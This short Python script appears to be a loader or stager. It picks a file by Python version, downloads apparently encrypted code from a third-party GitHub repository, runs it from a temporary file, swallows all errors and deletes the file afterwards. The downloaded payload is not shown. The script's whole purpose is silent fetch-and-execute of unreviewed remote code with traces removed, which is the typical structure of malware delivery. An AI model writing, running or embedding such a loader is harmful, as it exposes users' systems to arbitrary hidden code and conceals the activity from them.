import os
import sys
import tempfile
import runpy
import requests

# Configuration
ALLOWED_VERSIONS = [(3, 11), (3, 12), (3, 13)]
GITHUB_LINKS = {
    (3, 11): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/nosforsell_3.11_enc.py",
    (3, 12): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/nosforsell_3.12_enc.py",
    (3, 13): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/nosforsell_3.13_enc.py",
}

CURRENT_VERSION = (sys.version_info.major, sys.version_info.minor)


def main() -> None:
    if CURRENT_VERSION not in ALLOWED_VERSIONS:
        sys.exit(1)

    target_url = GITHUB_LINKS.get(CURRENT_VERSION, "")
    if not target_url:
        sys.exit(1)

    temp_path = None
    try:
        response = requests.get(target_url, timeout=15)
        if response.status_code != 200 or not response.text.strip():
            sys.exit(1)

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
            temp_file.write(response.text.encode("utf-8"))
            temp_path = temp_file.name

        runpy.run_path(temp_path, run_name="__main__")

    except Exception:
        sys.exit(1)
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except OSError:
                pass


if __name__ == "__main__":
    main()
